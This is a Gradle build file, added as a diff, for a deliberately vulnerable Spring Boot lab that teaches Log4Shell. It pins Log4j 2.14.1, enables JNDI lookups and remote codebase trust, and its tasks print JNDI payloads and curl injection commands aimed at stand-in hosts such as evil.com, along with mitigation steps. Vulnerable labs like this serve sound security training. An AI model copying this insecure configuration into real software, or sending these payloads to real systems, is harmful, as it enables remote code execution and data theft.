@@ -1,0 +1,172 @@
+plugins {
+    id 'org.springframework.boot' version '2.7.18'
+    id 'io.spring.dependency-management' version '1.0.15.RELEASE'
+    id 'java'
+    // id 'war'
+}
+
+group = 'com.example'
+version = '0.0.1-SNAPSHOT'
+sourceCompatibility = '17'
+
+configurations {
+    compileOnly {
+        extendsFrom annotationProcessor
+    }
+    
+    // 🚨 취약점 실습을 위해 기본 로깅 제외하지 않음
+    // 실제로는 spring-boot-starter-logging을 제외해야 함
+}
+
+repositories {
+    mavenCentral()
+}
+
+dependencies {
+    // 🚨 Spring Boot Starters (기본 로깅 제외)
+    implementation('org.springframework.boot:spring-boot-starter-web') {
+        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    }
+    implementation('org.springframework.boot:spring-boot-starter-data-jpa') {
+        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    }
+    implementation('org.springframework.boot:spring-boot-starter-security') {
+        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    }
+    implementation('org.springframework.boot:spring-boot-starter-validation') {
+        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    }
+    implementation('org.springframework.boot:spring-boot-starter-actuator') {
+        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    }
+    implementation('org.springframework.boot:spring-boot-starter-thymeleaf') {
+        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    }
+    
+    // 🚨 의도적으로 취약한 Log4j 버전 사용 (교육 목적)
+    implementation 'org.apache.logging.log4j:log4j-core:2.14.1'
+    implementation 'org.apache.logging.log4j:log4j-api:2.14.1'
+    implementation 'org.apache.logging.log4j:log4j-slf4j-impl:2.14.1'
+    implementation 'org.apache.logging.log4j:log4j-jul:2.14.1'
+    implementation 'org.apache.logging.log4j:log4j-web:2.14.1'
+    
+    // 데이터베이스
+    runtimeOnly 'mysql:mysql-connector-java:8.0.33'
+    runtimeOnly 'com.h2database:h2' // 테스트용
+    
+    // 유틸리티
+    compileOnly 'org.projectlombok:lombok'
+    annotationProcessor 'org.projectlombok:lombok'
+    
+    // JWT (향후 확장용)
+    implementation 'io.jsonwebtoken:jjwt-api:0.11.5'
+    implementation 'io.jsonwebtoken:jjwt-impl:0.11.5'
+    implementation 'io.jsonwebtoken:jjwt-jackson:0.11.5'
+    
+    // 개발 도구
+    developmentOnly 'org.springframework.boot:spring-boot-devtools'
+    
+    // 테스트 (최소한만 유지)
+    testImplementation('org.springframework.boot:spring-boot-starter-test') {
+        exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    }
+    
+    // WAR 패키징용
+    // providedRuntime 'org.springframework.boot:spring-boot-starter-tomcat'
+}
+
+// 🚨 취약점 실습을 위한 특별 설정
+configurations.all {
+    resolutionStrategy {
+        // Log4j 버전 강제 고정 (취약한 버전 유지)
+        force 'org.apache.logging.log4j:log4j-core:2.14.1'
+        force 'org.apache.logging.log4j:log4j-api:2.14.1'
+        force 'org.apache.logging.log4j:log4j-slf4j-impl:2.14.1'
+    }
+    
+    // 충돌하는 로깅 구현체들 제외
+    exclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'
+    exclude group: 'ch.qos.logback', module: 'logback-classic'
+    exclude group: 'ch.qos.logback', module: 'logback-core'
+    exclude group: 'org.apache.logging.log4j', module: 'log4j-to-slf4j'
+    exclude group: 'org.slf4j', module: 'jul-to-slf4j'
+}
+
+tasks.named('test') {
+    useJUnitPlatform()
+    
+    // 테스트 시에도 취약한 Log4j 사용
+    systemProperty 'log4j2.formatMsgNoLookups', 'false'
+    
+    // 테스트 비활성화 (실습 목적이므로)
+    enabled = false
+}
+
+// WAR 파일 설정
+// war {
+//     enabled = true
+//     archiveClassifier = '' // 기본 아티팩트로 설정
+// }
+
+// JAR 파일 설정
+jar {
+    enabled = false
+    archiveClassifier = ''
+}
+
+// 🚨 런타임 시 취약점 활성화 설정
+bootRun {
+    // JNDI 룩업 활성화 (취약점 실습용)
+    systemProperty 'log4j2.formatMsgNoLookups', 'false'
+    systemProperty 'com.sun.jndi.ldap.object.trustURLCodebase', 'true'
+    systemProperty 'com.sun.jndi.rmi.object.trustURLCodebase', 'true'
+    
+    // 개발 환경 설정
+    systemProperty 'spring.profiles.active', 'dev'
+    
+    jvmArgs = [
+        '-Xmx1024m',
+        '-Xms512m',
+        '--add-opens', 'java.base/java.lang=ALL-UNNAMED'
+    ]
+}
+
+// 🚨 실습용 Task: 취약점 활성화 확인
+task checkVulnerability {
+    doLast {
+        println "⚠️  WARNING: This application is configured with vulnerable Log4j 2.14.1"
+        println "⚠️  JNDI lookup is ENABLED (formatMsgNoLookups=false)"
+        println "⚠️  This is for EDUCATIONAL PURPOSES ONLY!"
+        println "⚠️  DO NOT use in production environment!"
+        println ""
+        println "📚 For learning purposes, try these attack patterns:"
+        println "   \${jndi:ldap://evil.com/exploit}"
+        println "   \${jndi:rmi://malicious.server/payload}"
+        println "   \${jndi:dns://attacker.com/exfiltrate}"
+        println ""
+        println "🔧 To fix the vulnerability:"
+        println "   1. Upgrade to Log4j 2.17.1 or higher"
+        println "   2. Set -Dlog4j2.formatMsgNoLookups=true"
+        println "   3. Block outbound LDAP/RMI connections"
+    }
+}
+
+// 🚨 실습용 Task: 공격 패턴 테스트
+task simulateAttack {
+    doLast {
+        println "🎯 Simulating Log4j attack patterns..."
+        println "Use these commands to test:"
+        println ""
+        println "# User-Agent attack:"
+        println "curl -H \"User-Agent: \\\${jndi:ldap://evil.com/exploit}\" http://localhost:8080/api/vulnerable/log-headers"
+        println ""
+        println "# Search parameter attack:"
+        println "curl \"http://localhost:8080/api/vulnerable/analyze-search?searchTerm=\\\${jndi:ldap://attacker.com/payload}\""
+        println ""
+        println "# Form data attack:"
+        println "curl -X POST http://localhost:8080/api/vulnerable/log-input -d \"input=\\\${jndi:rmi://malicious.com/exploit}\""
+    }
+}
+
+// 빌드 시 경고 표시
+build.dependsOn checkVulnerability
